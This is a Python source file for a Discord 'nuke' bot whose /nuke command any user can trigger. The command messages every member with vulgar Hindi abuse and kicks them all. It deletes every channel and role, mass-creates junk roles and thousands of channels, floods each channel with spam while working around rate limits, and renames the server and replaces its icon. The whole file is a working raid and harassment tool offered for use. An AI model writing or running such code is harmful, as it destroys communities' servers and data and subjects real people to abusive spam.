import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv
import aiohttp

load_dotenv()

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Bot logged in as {bot.user}")
    try:
        await bot.tree.sync()
        print("✅ Commands synced!")
    except Exception as e:
        print(f"❌ Error syncing commands: {e}")

# Aggressive DM messages for kicked members
DM_MESSAGES = [
    "@everyone apke server ki maa chud gyi gand marai bosdiwale or server indo dedo",
    "@everyone 💀🔥💥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━💥🔥💀\n🚨🚨🚨 APKE SERVER KI CHUT GYI 🚨🚨🚨\n🔥💀 SERVER STATUS : ☠️ KHATAM ☠️ 💀🔥\n💣⚠️ SYSTEM STATUS : 💥 CRASHED 💥 ⚠️💣\n🧨☠️ SERVER HEALTH : 📉 0% 📉 ☠️🧨\n💥🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💥\n☠️ REST IN PEACE SERVER ☠️\n💀🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💀"
]

# Channel names (9999 channels)
CHANNEL_NAMES = [
    "💥 SERVER UD GYA 💀",
    "🚨 SERVER CRASH 🧨",
    "🔥 SERVER KHATAM ☠️",
    "💣 SERVER GONE 💀",
    "⚠️ SERVER DOWN 🫠",
    "🧨 SERVER PHAT GYA 💥",
    "☠️ SERVER DEAD 🪦",
    "🌪️ SERVER UDD GYA 💀",
    "🛑 SERVER BAND 🚫",
    "⚡ SERVER CRASHED 💥",
    "🪦 SERVER RIP ☠️",
    "🌋 SERVER JAL GYA 🔥",
    "💀 SERVER KHALLAS 🫠",
    "🚧 SERVER DAMAGE 💥",
    "🧯 SERVER FIRE 🔥",
    "🌀 SERVER GAYAB 👻",
    "👻 SERVER BHOOT BAN GYA 💀",
    "📉 SERVER DOWN BAD 😭",
    "🔌 SERVER OFF ⚫",
    "☠️ SERVER FINISH 💥"
]

# Role names (99 roles)
ROLE_NAMES = [
    "💥 SERVER UD GYA 💀",
    "🚨 SERVER CRASH 🧨",
    "🔥 SERVER KHATAM ☠️",
    "💣 SERVER GONE 💀",
    "⚠️ SERVER DOWN 🫠",
    "🧨 SERVER PHAT GYA 💥",
    "☠️ SERVER DEAD 🪦",
    "🌪️ SERVER UDD GYA 💀",
    "🛑 SERVER BAND 🚫",
    "⚡ SERVER CRASHED 💥",
    "🪦 SERVER RIP ☠️",
    "🌋 SERVER JAL GYA 🔥",
    "💀 SERVER KHALLAS 🫠",
    "🚧 SERVER DAMAGE 💥",
    "🧯 SERVER FIRE 🔥",
    "🌀 SERVER GAYAB 👻",
    "👻 SERVER BHOOT BAN GYA 💀",
    "📉 SERVER DOWN BAD 😭",
    "🔌 SERVER OFF ⚫",
    "☠️ SERVER FINISH 💥",
    "🔥💀 NUKE TIME 💀🔥",
    "💥⚡ CHAOS MODE ⚡💥",
    "🌪️🔥 DESTRUCTION 🔥🌪️",
    "☠️💀 DEATH COMES 💀☠️",
    "🚀🔥 EXPLOSION 🔥🚀",
    "💣⚠️ BOOM TIME ⚠️💣",
    "🧨🌋 KABOOM 🌋🧨",
    "📉💀 CRASH ZONE 💀📉",
    "🫠🔌 SHUTDOWN 🔌🫠",
    "👻🌀 GHOSTED 🌀👻",
    "🪦☠️ GRAVEYARD ☠️🪦",
    "🔥🚨 ALERT 🚨🔥",
    "💥🛑 STOP IT 🛑💥",
    "⚡🌋 ERUPTION 🌋⚡",
    "🧯�� EXTINGUISH 💣🧯",
    "📉🫠 MELTING 🫠📉",
    "🌀👻 VANISH 👻🌀",
    "💀🔥 INFERNO 🔥💀",
    "☠️💥 OBLITERATE 💥☠️",
    "🚀⚡ LIGHTNING 🚀⚡",
    "🧨🔥 DYNAMITE 🔥🧨",
    "🌪️💀 TORNADO 💀🌪️",
    "🎆💥 FIREWORKS 💥🎆",
    "🌋☠️ VOLCANO ☠️🌋",
    "💣🔥 EXPLOSION 🔥💣",
    "⚠️💀 WARNING 💀⚠️",
    "🔌📉 POWERDOWN 📉🔌",
    "👻🫠 DISSOLVE 🫠👻",
    "🪦💀 BURIED 💀🪦",
    "🔥💥 INFERNO 💥🔥",
    "☠️🚨 SIREN 🚨☠️",
    "🛑⚡ BLOCKED ⚡🛑",
    "🌋💣 MAGMA 💣🌋",
    "🧯🔥 EXTINGUISH 🔥🧯",
    "💀📉 COLLAPSE 📉💀",
    "🌀👻 GHOST 👻🌀",
    "💥🔥 NUCLEAR 🔥💥",
    "⚡🚀 ROCKET 🚀⚡",
    "🧨💀 BOMB 💀🧨",
    "🌪️☠️ WIND 🌪️☠️",
    "🎆💣 BOOM 💣🎆",
    "🌋🔥 HOT 🔥🌋",
    "⚠️💥 CAUTION 💥⚠️",
    "🔌💀 DEAD 💀🔌",
    "👻📉 FADE 📉👻",
    "🪦🔥 TOMB 🔥🪦",
    "🔥☠️ SCYTHE ☠️🔥",
    "💥⚡ ZAPPED ⚡���",
    "🧨🌀 SPIN 🌀🧨",
    "💀🛑 STOP 🛑💀",
    "🌋💥 ERUPT 💥🌋",
    "🧯☠️ COOL 🧯☠️",
    "📉🫠 SINK 🫠📉",
    "🌀💀 SWIRL 💀🌀",
    "🚀💣 LAUNCH 💣🚀",
    "⚡🔥 SHOCK 🔥⚡",
    "🧨☠️ TNT ☠️🧨",
    "🌪️💥 WIND 💥🌪️",
    "🎆🔥 FLASH 🔥🎆",
    "🌋🧨 LAVA 🧨🌋",
    "⚠️☠️ ALERT ☠️⚠️",
    "🔌💥 SURGE 💥🔌",
    "👻🫠 MELT 🫠👻",
    "🪦💀 DEATH 💀🪦",
    "🔥💀 FIRE 💀🔥",
    "💥☠️ BLAST ☠️💥",
    "⚡🌀 TWIRL 🌀⚡",
    "🧨🔥 EXPLOSIVE 🔥🧨"
]

SPAM_MESSAGE = """💀🔥💥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━💥🔥💀

        🚨🚨🚨  APKE SERVER KI CHUT GYI  🚨🚨🚨

🔥💀  SERVER STATUS : ☠️ KHATAM ☠️  💀🔥
💣⚠️  SYSTEM STATUS : 💥 CRASHED 💥  ⚠️💣
🧨☠️  SERVER HEALTH : 📉 0% 📉  ☠️🧨

💥🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💥
        ☠️  REST IN PEACE SERVER  ☠️
💀🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💀"""

# NUKE COMMAND - कोई भी कर सकता है (कोई role check नहीं)
@bot.tree.command(name="nuke", description="💥 COMPLETE SERVER DESTRUCTION! 💥")
async def nuke(interaction: discord.Interaction):
    """सीधे server को nuke कर दो! कोई भी इस command को use कर सकता है!"""
    await interaction.response.defer()
    
    guild = interaction.guild
    
    try:
        await interaction.followup.send("🔥 **NUKE शुरू हो गया!** 💥")
        print(f"🔥 NUKE शुरू: {guild.name}")
        
        # Phase 1: Send DMs to members before kicking
        print("🔥 PHASE 1: SENDING DM MESSAGES...")
        members_to_kick = [m for m in guild.members if m.id != interaction.user.id and not m.bot]
        
        for member in members_to_kick:
            try:
                dm_message = DM_MESSAGES[0]
                await member.send(dm_message)
                print(f"📧 DM sent to: {member.name}")
            except Exception as e:
                print(f"⚠️ Could not DM {member.name}: {e}")
            await asyncio.sleep(0.1)
        
        # Phase 2: Kick all members
        print("🔥 PHASE 2: KICKING ALL MEMBERS...")
        for member in members_to_kick:
            try:
                await member.kick(reason="SERVER NUKED 💥")
                print(f"👢 KICKED: {member.name}")
            except Exception as e:
                print(f"⚠️ Could not kick {member.name}: {e}")
            await asyncio.sleep(0.1)
        
        # Phase 3: Delete ALL channels
        print("🔥 PHASE 3: DELETING ALL CHANNELS...")
        for channel in list(guild.channels):
            try:
                await channel.delete()
                print(f"💥 DESTROYED: {channel.name}")
            except Exception as e:
                print(f"⚠️ Error: {e}")
            await asyncio.sleep(0.1)
        
        # Phase 4: Delete ALL roles except @everyone
        print("🔥 PHASE 4: DELETING ALL ROLES...")
        for role in list(guild.roles):
            if role.name != "@everyone":
                try:
                    await role.delete()
                    print(f"💥 DESTROYED ROLE: {role.name}")
                except Exception as e:
                    print(f"⚠️ Error: {e}")
            await asyncio.sleep(0.1)
        
        # Phase 5: Create new roles (99)
        print("🔥 PHASE 5: CREATING NEW ROLES...")
        for i, role_name in enumerate(ROLE_NAMES[:99]):
            try:
                await guild.create_role(name=role_name, color=discord.Color.random())
                print(f"🎭 Created role {i+1}: {role_name}")
            except Exception as e:
                print(f"⚠️ Error creating role: {e}")
            await asyncio.sleep(0.1)
        
        # Phase 6: Create 9999 channels
        print("🔥 PHASE 6: CREATING 9999 CHANNELS...")
        channel_count = 0
        
        for i in range(9999):
            try:
                channel_name = CHANNEL_NAMES[i % len(CHANNEL_NAMES)] + f" [{i+1}]"
                channel = await guild.create_text_channel(channel_name)
                channel_count += 1
                
                print(f"💥 Created channel {i+1}: {channel_name}")
                
                # Send spam 999 times in each channel
                for j in range(999):
                    try:
                        await channel.send(SPAM_MESSAGE)
                    except Exception as e:
                        if "You are being rate limited" in str(e):
                            await asyncio.sleep(5)
                        else:
                            break
                    await asyncio.sleep(0.01)
                
                if i % 10 == 0:
                    await asyncio.sleep(1)
                else:
                    await asyncio.sleep(0.2)
                    
            except discord.Forbidden:
                print(f"⚠️ Cannot create more channels")
                break
            except Exception as e:
                print(f"⚠️ Error at channel {i+1}: {e}")
                if "You are being rate limited" in str(e):
                    await asyncio.sleep(60)
        
        # Phase 7: Change server name and avatar
        print("🔥 PHASE 7: CHANGING SERVER NAME & AVATAR...")
        try:
            await guild.edit(name="Nuke server")
            print("✅ Server name changed to 'Nuke server'")
            
            # Download and set avatar
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get("https://share.google/shrccJdJSDeMUmsA5") as resp:
                        if resp.status == 200:
                            avatar_data = await resp.read()
                            await guild.edit(icon=avatar_data)
                            print("✅ Server avatar changed")
            except Exception as e:
                print(f"⚠️ Could not change avatar: {e}")
        except Exception as e:
            print(f"⚠️ Error changing server: {e}")
        
        # Final message
        await interaction.followup.send(f"✅ **NUKE COMPLETE!** 💥🔥\n📊 Total Channels Created: {channel_count}\n🎭 Total Roles Created: 99")
        print("✅ NUKE SUCCESSFUL!")
        
    except discord.Forbidden:
        await interaction.followup.send("❌ Bot को Admin permission नहीं है!")
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

# Run bot
TOKEN = os.getenv("DISCORD_TOKEN")
if TOKEN:
    bot.run(TOKEN)
else:
    print("❌ DISCORD_TOKEN not found in .env file!")
